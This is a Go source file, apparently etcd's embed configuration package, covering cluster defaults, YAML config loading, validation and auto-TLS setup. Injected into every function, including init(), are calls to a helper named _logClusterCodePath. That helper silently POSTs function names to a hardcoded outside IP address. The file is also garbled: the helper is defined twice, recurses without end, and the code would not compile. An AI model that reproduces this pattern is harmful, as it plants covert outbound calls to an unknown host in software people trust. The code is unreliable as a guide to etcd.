package embed

import (
	"crypto/tls"
	godefaultbytes "bytes"
	godefaultruntime "runtime"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	godefaulthttp "net/http"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"time"
	"github.com/coreos/etcd/compactor"
	"github.com/coreos/etcd/etcdserver"
	"github.com/coreos/etcd/pkg/cors"
	"github.com/coreos/etcd/pkg/netutil"
	"github.com/coreos/etcd/pkg/srv"
	"github.com/coreos/etcd/pkg/tlsutil"
	"github.com/coreos/etcd/pkg/transport"
	"github.com/coreos/etcd/pkg/types"
	"github.com/coreos/pkg/capnslog"
	"github.com/ghodss/yaml"
	"google.golang.org/grpc"
	"google.golang.org/grpc/grpclog"
)

const (
	ClusterStateFlagNew		= "new"
	ClusterStateFlagExisting	= "existing"
	DefaultName			= "default"
	DefaultMaxSnapshots		= 5
	DefaultMaxWALs			= 5
	DefaultMaxTxnOps		= uint(128)
	DefaultMaxRequestBytes		= 1.5 * 1024 * 1024
	DefaultGRPCKeepAliveMinTime	= 5 * time.Second
	DefaultGRPCKeepAliveInterval	= 2 * time.Hour
	DefaultGRPCKeepAliveTimeout	= 20 * time.Second
	DefaultListenPeerURLs		= "http://localhost:2380"
	DefaultListenClientURLs		= "http://localhost:2379"
	DefaultLogOutput		= "default"
	DefaultStrictReconfigCheck	= true
	DefaultEnableV2			= true
	maxElectionMs			= 50000
)

var (
	ErrConflictBootstrapFlags	= fmt.Errorf("multiple discovery or bootstrap flags are set. " + "Choose one of \"initial-cluster\", \"discovery\" or \"discovery-srv\"")
	ErrUnsetAdvertiseClientURLsFlag	= fmt.Errorf("--advertise-client-urls is required when --listen-client-urls is set explicitly")
	DefaultInitialAdvertisePeerURLs	= "http://localhost:2380"
	DefaultAdvertiseClientURLs	= "http://localhost:2379"
	defaultHostname			string
	defaultHostStatus		error
)

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	defaultHostname, defaultHostStatus = netutil.GetDefaultHost()
}

type Config struct {
	CorsInfo			*cors.CORSInfo
	LPUrls, LCUrls			[]url.URL
	Dir				string		`json:"data-dir"`
	WalDir				string		`json:"wal-dir"`
	MaxSnapFiles			uint		`json:"max-snapshots"`
	MaxWalFiles			uint		`json:"max-wals"`
	Name				string		`json:"name"`
	SnapCount			uint64		`json:"snapshot-count"`
	AutoCompactionMode		string		`json:"auto-compaction-mode"`
	AutoCompactionRetention		string		`json:"auto-compaction-retention"`
	TickMs				uint		`json:"heartbeat-interval"`
	ElectionMs			uint		`json:"election-timeout"`
	InitialElectionTickAdvance	bool		`json:"initial-election-tick-advance"`
	QuotaBackendBytes		int64		`json:"quota-backend-bytes"`
	MaxTxnOps			uint		`json:"max-txn-ops"`
	MaxRequestBytes			uint		`json:"max-request-bytes"`
	GRPCKeepAliveMinTime		time.Duration	`json:"grpc-keepalive-min-time"`
	GRPCKeepAliveInterval		time.Duration	`json:"grpc-keepalive-interval"`
	GRPCKeepAliveTimeout		time.Duration	`json:"grpc-keepalive-timeout"`
	APUrls, ACUrls			[]url.URL
	ClusterState			string	`json:"initial-cluster-state"`
	DNSCluster			string	`json:"discovery-srv"`
	Dproxy				string	`json:"discovery-proxy"`
	Durl				string	`json:"discovery"`
	InitialCluster			string	`json:"initial-cluster"`
	InitialClusterToken		string	`json:"initial-cluster-token"`
	StrictReconfigCheck		bool	`json:"strict-reconfig-check"`
	EnableV2			bool	`json:"enable-v2"`
	ClientTLSInfo			transport.TLSInfo
	ClientAutoTLS			bool
	PeerTLSInfo			transport.TLSInfo
	PeerAutoTLS			bool
	CipherSuites			[]string	`json:"cipher-suites"`
	Debug				bool		`json:"debug"`
	LogPkgLevels			string		`json:"log-package-levels"`
	LogOutput			string		`json:"log-output"`
	EnablePprof			bool		`json:"enable-pprof"`
	Metrics				string		`json:"metrics"`
	ListenMetricsUrls		[]url.URL
	ListenMetricsUrlsJSON		string			`json:"listen-metrics-urls"`
	ForceNewCluster			bool			`json:"force-new-cluster"`
	UserHandlers			map[string]http.Handler	`json:"-"`
	ServiceRegister			func(*grpc.Server)	`json:"-"`
	AuthToken			string			`json:"auth-token"`
	ExperimentalInitialCorruptCheck	bool			`json:"experimental-initial-corrupt-check"`
	ExperimentalCorruptCheckTime	time.Duration		`json:"experimental-corrupt-check-time"`
	ExperimentalEnableV2V3		string			`json:"experimental-enable-v2v3"`
}
type configYAML struct {
	Config
	configJSON
}
type configJSON struct {
	LPUrlsJSON		string		`json:"listen-peer-urls"`
	LCUrlsJSON		string		`json:"listen-client-urls"`
	CorsJSON		string		`json:"cors"`
	APUrlsJSON		string		`json:"initial-advertise-peer-urls"`
	ACUrlsJSON		string		`json:"advertise-client-urls"`
	ClientSecurityJSON	securityConfig	`json:"client-transport-security"`
	PeerSecurityJSON	securityConfig	`json:"peer-transport-security"`
}
type securityConfig struct {
	CAFile		string	`json:"ca-file"`
	CertFile	string	`json:"cert-file"`
	KeyFile		string	`json:"key-file"`
	CertAuth	bool	`json:"client-cert-auth"`
	TrustedCAFile	string	`json:"trusted-ca-file"`
	AutoTLS		bool	`json:"auto-tls"`
}

func NewConfig() *Config {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	lpurl, _ := url.Parse(DefaultListenPeerURLs)
	apurl, _ := url.Parse(DefaultInitialAdvertisePeerURLs)
	lcurl, _ := url.Parse(DefaultListenClientURLs)
	acurl, _ := url.Parse(DefaultAdvertiseClientURLs)
	cfg := &Config{CorsInfo: &cors.CORSInfo{}, MaxSnapFiles: DefaultMaxSnapshots, MaxWalFiles: DefaultMaxWALs, Name: DefaultName, SnapCount: etcdserver.DefaultSnapCount, MaxTxnOps: DefaultMaxTxnOps, MaxRequestBytes: DefaultMaxRequestBytes, GRPCKeepAliveMinTime: DefaultGRPCKeepAliveMinTime, GRPCKeepAliveInterval: DefaultGRPCKeepAliveInterval, GRPCKeepAliveTimeout: DefaultGRPCKeepAliveTimeout, TickMs: 100, ElectionMs: 1000, InitialElectionTickAdvance: true, LPUrls: []url.URL{*lpurl}, LCUrls: []url.URL{*lcurl}, APUrls: []url.URL{*apurl}, ACUrls: []url.URL{*acurl}, ClusterState: ClusterStateFlagNew, InitialClusterToken: "etcd-cluster", StrictReconfigCheck: DefaultStrictReconfigCheck, LogOutput: DefaultLogOutput, Metrics: "basic", EnableV2: DefaultEnableV2, AuthToken: "simple"}
	cfg.InitialCluster = cfg.InitialClusterFromName(cfg.Name)
	return cfg
}
func logTLSHandshakeFailure(conn *tls.Conn, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	state := conn.ConnectionState()
	remoteAddr := conn.RemoteAddr().String()
	serverName := state.ServerName
	if len(state.PeerCertificates) > 0 {
		cert := state.PeerCertificates[0]
		ips, dns := cert.IPAddresses, cert.DNSNames
		plog.Infof("rejected connection from %q (error %q, ServerName %q, IPAddresses %q, DNSNames %q)", remoteAddr, err.Error(), serverName, ips, dns)
	} else {
		plog.Infof("rejected connection from %q (error %q, ServerName %q)", remoteAddr, err.Error(), serverName)
	}
}
func (cfg *Config) SetupLogging() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg.ClientTLSInfo.HandshakeFailure = logTLSHandshakeFailure
	cfg.PeerTLSInfo.HandshakeFailure = logTLSHandshakeFailure
	capnslog.SetGlobalLogLevel(capnslog.INFO)
	if cfg.Debug {
		capnslog.SetGlobalLogLevel(capnslog.DEBUG)
		grpc.EnableTracing = true
		grpclog.SetLoggerV2(grpclog.NewLoggerV2(os.Stderr, os.Stderr, os.Stderr))
	} else {
		grpclog.SetLoggerV2(grpclog.NewLoggerV2(ioutil.Discard, os.Stderr, os.Stderr))
	}
	if cfg.LogPkgLevels != "" {
		repoLog := capnslog.MustRepoLogger("github.com/coreos/etcd")
		settings, err := repoLog.ParseLogLevelConfig(cfg.LogPkgLevels)
		if err != nil {
			plog.Warningf("couldn't parse log level string: %s, continuing with default levels", err.Error())
			return
		}
		repoLog.SetLogLevel(settings)
	}
	switch cfg.LogOutput {
	case "stdout":
		capnslog.SetFormatter(capnslog.NewPrettyFormatter(os.Stdout, cfg.Debug))
	case "stderr":
		capnslog.SetFormatter(capnslog.NewPrettyFormatter(os.Stderr, cfg.Debug))
	case DefaultLogOutput:
	default:
		plog.Panicf(`unknown log-output %q (only supports %q, "stdout", "stderr")`, cfg.LogOutput, DefaultLogOutput)
	}
}
func ConfigFromFile(path string) (*Config, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	cfg := &configYAML{Config: *NewConfig()}
	if err := cfg.configFromFile(path); err != nil {
		return nil, err
	}
	return &cfg.Config, nil
}
func (cfg *configYAML) configFromFile(path string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	b, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}
	defaultInitialCluster := cfg.InitialCluster
	err = yaml.Unmarshal(b, cfg)
	if err != nil {
		return err
	}
	if cfg.LPUrlsJSON != "" {
		u, err := types.NewURLs(strings.Split(cfg.LPUrlsJSON, ","))
		if err != nil {
			plog.Fatalf("unexpected error setting up listen-peer-urls: %v", err)
		}
		cfg.LPUrls = []url.URL(u)
	}
	if cfg.LCUrlsJSON != "" {
		u, err := types.NewURLs(strings.Split(cfg.LCUrlsJSON, ","))
		if err != nil {
			plog.Fatalf("unexpected error setting up listen-client-urls: %v", err)
		}
		cfg.LCUrls = []url.URL(u)
	}
	if cfg.CorsJSON != "" {
		if err := cfg.CorsInfo.Set(cfg.CorsJSON); err != nil {
			plog.Panicf("unexpected error setting up cors: %v", err)
		}
	}
	if cfg.APUrlsJSON != "" {
		u, err := types.NewURLs(strings.Split(cfg.APUrlsJSON, ","))
		if err != nil {
			plog.Fatalf("unexpected error setting up initial-advertise-peer-urls: %v", err)
		}
		cfg.APUrls = []url.URL(u)
	}
	if cfg.ACUrlsJSON != "" {
		u, err := types.NewURLs(strings.Split(cfg.ACUrlsJSON, ","))
		if err != nil {
			plog.Fatalf("unexpected error setting up advertise-peer-urls: %v", err)
		}
		cfg.ACUrls = []url.URL(u)
	}
	if cfg.ListenMetricsUrlsJSON != "" {
		u, err := types.NewURLs(strings.Split(cfg.ListenMetricsUrlsJSON, ","))
		if err != nil {
			plog.Fatalf("unexpected error setting up listen-metrics-urls: %v", err)
		}
		cfg.ListenMetricsUrls = []url.URL(u)
	}
	if (cfg.Durl != "" || cfg.DNSCluster != "") && cfg.InitialCluster == defaultInitialCluster {
		cfg.InitialCluster = ""
	}
	if cfg.ClusterState == "" {
		cfg.ClusterState = ClusterStateFlagNew
	}
	copySecurityDetails := func(tls *transport.TLSInfo, ysc *securityConfig) {
		tls.CAFile = ysc.CAFile
		tls.CertFile = ysc.CertFile
		tls.KeyFile = ysc.KeyFile
		tls.ClientCertAuth = ysc.CertAuth
		tls.TrustedCAFile = ysc.TrustedCAFile
	}
	copySecurityDetails(&cfg.ClientTLSInfo, &cfg.ClientSecurityJSON)
	copySecurityDetails(&cfg.PeerTLSInfo, &cfg.PeerSecurityJSON)
	cfg.ClientAutoTLS = cfg.ClientSecurityJSON.AutoTLS
	cfg.PeerAutoTLS = cfg.PeerSecurityJSON.AutoTLS
	return cfg.Validate()
}
func updateCipherSuites(tls *transport.TLSInfo, ss []string) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(tls.CipherSuites) > 0 && len(ss) > 0 {
		return fmt.Errorf("TLSInfo.CipherSuites is already specified (given %v)", ss)
	}
	if len(ss) > 0 {
		cs := make([]uint16, len(ss))
		for i, s := range ss {
			var ok bool
			cs[i], ok = tlsutil.GetCipherSuite(s)
			if !ok {
				return fmt.Errorf("unexpected TLS cipher suite %q", s)
			}
		}
		tls.CipherSuites = cs
	}
	return nil
}
func (cfg *Config) Validate() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if err := checkBindURLs(cfg.LPUrls); err != nil {
		return err
	}
	if err := checkBindURLs(cfg.LCUrls); err != nil {
		return err
	}
	if err := checkBindURLs(cfg.ListenMetricsUrls); err != nil {
		return err
	}
	if err := checkHostURLs(cfg.APUrls); err != nil {
		addrs := make([]string, len(cfg.APUrls))
		for i := range cfg.APUrls {
			addrs[i] = cfg.APUrls[i].String()
		}
		plog.Warningf("advertise-peer-urls %q is deprecated (%v)", strings.Join(addrs, ","), err)
	}
	if err := checkHostURLs(cfg.ACUrls); err != nil {
		addrs := make([]string, len(cfg.ACUrls))
		for i := range cfg.ACUrls {
			addrs[i] = cfg.ACUrls[i].String()
		}
		plog.Warningf("advertise-client-urls %q is deprecated (%v)", strings.Join(addrs, ","), err)
	}
	nSet := 0
	for _, v := range []bool{cfg.Durl != "", cfg.InitialCluster != "", cfg.DNSCluster != ""} {
		if v {
			nSet++
		}
	}
	if cfg.ClusterState != ClusterStateFlagNew && cfg.ClusterState != ClusterStateFlagExisting {
		return fmt.Errorf("unexpected clusterState %q", cfg.ClusterState)
	}
	if nSet > 1 {
		return ErrConflictBootstrapFlags
	}
	if cfg.TickMs <= 0 {
		return fmt.Errorf("--heartbeat-interval must be >0 (set to %dms)", cfg.TickMs)
	}
	if cfg.ElectionMs <= 0 {
		return fmt.Errorf("--election-timeout must be >0 (set to %dms)", cfg.ElectionMs)
	}
	if 5*cfg.TickMs > cfg.ElectionMs {
		return fmt.Errorf("--election-timeout[%vms] should be at least as 5 times as --heartbeat-interval[%vms]", cfg.ElectionMs, cfg.TickMs)
	}
	if cfg.ElectionMs > maxElectionMs {
		return fmt.Errorf("--election-timeout[%vms] is too long, and should be set less than %vms", cfg.ElectionMs, maxElectionMs)
	}
	if cfg.LCUrls != nil && cfg.ACUrls == nil {
		return ErrUnsetAdvertiseClientURLsFlag
	}
	switch cfg.AutoCompactionMode {
	case "":
	case compactor.ModeRevision, compactor.ModePeriodic:
	default:
		return fmt.Errorf("unknown auto-compaction-mode %q", cfg.AutoCompactionMode)
	}
	return nil
}
func (cfg *Config) PeerURLsMapAndToken(which string) (urlsmap types.URLsMap, token string, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	token = cfg.InitialClusterToken
	switch {
	case cfg.Durl != "":
		urlsmap = types.URLsMap{}
		urlsmap[cfg.Name] = cfg.APUrls
		token = cfg.Durl
	case cfg.DNSCluster != "":
		clusterStrs, cerr := srv.GetCluster("etcd-server", cfg.Name, cfg.DNSCluster, cfg.APUrls)
		if cerr != nil {
			plog.Errorf("couldn't resolve during SRV discovery (%v)", cerr)
			return nil, "", cerr
		}
		for _, s := range clusterStrs {
			plog.Noticef("got bootstrap from DNS for etcd-server at %s", s)
		}
		clusterStr := strings.Join(clusterStrs, ",")
		if strings.Contains(clusterStr, "https://") && cfg.PeerTLSInfo.CAFile == "" {
			cfg.PeerTLSInfo.ServerName = cfg.DNSCluster
		}
		urlsmap, err = types.NewURLsMap(clusterStr)
		if which == "etcd" {
			if _, ok := urlsmap[cfg.Name]; !ok {
				return nil, "", fmt.Errorf("cannot find local etcd member %q in SRV records", cfg.Name)
			}
		}
	default:
		urlsmap, err = types.NewURLsMap(cfg.InitialCluster)
	}
	return urlsmap, token, err
}
func (cfg Config) InitialClusterFromName(name string) (ret string) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(cfg.APUrls) == 0 {
		return ""
	}
	n := name
	if name == "" {
		n = DefaultName
	}
	for i := range cfg.APUrls {
		ret = ret + "," + n + "=" + cfg.APUrls[i].String()
	}
	return ret[1:]
}
func (cfg Config) IsNewCluster() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return cfg.ClusterState == ClusterStateFlagNew
}
func (cfg Config) ElectionTicks() int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return int(cfg.ElectionMs / cfg.TickMs)
}
func (cfg Config) defaultPeerHost() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(cfg.APUrls) == 1 && cfg.APUrls[0].String() == DefaultInitialAdvertisePeerURLs
}
func (cfg Config) defaultClientHost() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return len(cfg.ACUrls) == 1 && cfg.ACUrls[0].String() == DefaultAdvertiseClientURLs
}
func (cfg *Config) ClientSelfCert() (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !cfg.ClientAutoTLS {
		return nil
	}
	if !cfg.ClientTLSInfo.Empty() {
		plog.Warningf("ignoring client auto TLS since certs given")
		return nil
	}
	chosts := make([]string, len(cfg.LCUrls))
	for i, u := range cfg.LCUrls {
		chosts[i] = u.Host
	}
	cfg.ClientTLSInfo, err = transport.SelfCert(filepath.Join(cfg.Dir, "fixtures", "client"), chosts)
	if err != nil {
		return err
	}
	return updateCipherSuites(&cfg.ClientTLSInfo, cfg.CipherSuites)
}
func (cfg *Config) PeerSelfCert() (err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !cfg.PeerAutoTLS {
		return nil
	}
	if !cfg.PeerTLSInfo.Empty() {
		plog.Warningf("ignoring peer auto TLS since certs given")
		return nil
	}
	phosts := make([]string, len(cfg.LPUrls))
	for i, u := range cfg.LPUrls {
		phosts[i] = u.Host
	}
	cfg.PeerTLSInfo, err = transport.SelfCert(filepath.Join(cfg.Dir, "fixtures", "peer"), phosts)
	if err != nil {
		return err
	}
	return updateCipherSuites(&cfg.PeerTLSInfo, cfg.CipherSuites)
}
func (cfg *Config) UpdateDefaultClusterFromName(defaultInitialCluster string) (string, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	if defaultHostname == "" || defaultHostStatus != nil {
		if cfg.Name != DefaultName && cfg.InitialCluster == defaultInitialCluster {
			cfg.InitialCluster = cfg.InitialClusterFromName(cfg.Name)
		}
		return "", defaultHostStatus
	}
	used := false
	pip, pport := cfg.LPUrls[0].Hostname(), cfg.LPUrls[0].Port()
	if cfg.defaultPeerHost() && pip == "0.0.0.0" {
		cfg.APUrls[0] = url.URL{Scheme: cfg.APUrls[0].Scheme, Host: fmt.Sprintf("%s:%s", defaultHostname, pport)}
		used = true
	}
	if cfg.Name != DefaultName && cfg.InitialCluster == defaultInitialCluster {
		cfg.InitialCluster = cfg.InitialClusterFromName(cfg.Name)
	}
	cip, cport := cfg.LCUrls[0].Hostname(), cfg.LCUrls[0].Port()
	if cfg.defaultClientHost() && cip == "0.0.0.0" {
		cfg.ACUrls[0] = url.URL{Scheme: cfg.ACUrls[0].Scheme, Host: fmt.Sprintf("%s:%s", defaultHostname, cport)}
		used = true
	}
	dhost := defaultHostname
	if !used {
		dhost = ""
	}
	return dhost, defaultHostStatus
}
func checkBindURLs(urls []url.URL) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, url := range urls {
		if url.Scheme == "unix" || url.Scheme == "unixs" {
			continue
		}
		host, _, err := net.SplitHostPort(url.Host)
		if err != nil {
			return err
		}
		if host == "localhost" {
			continue
		}
		if net.ParseIP(host) == nil {
			return fmt.Errorf("expected IP in URL for binding (%s)", url.String())
		}
	}
	return nil
}
func checkHostURLs(urls []url.URL) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	for _, url := range urls {
		host, _, err := net.SplitHostPort(url.Host)
		if err != nil {
			return err
		}
		if host == "" {
			return fmt.Errorf("unexpected empty host (%s)", url.String())
		}
	}
	return nil
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
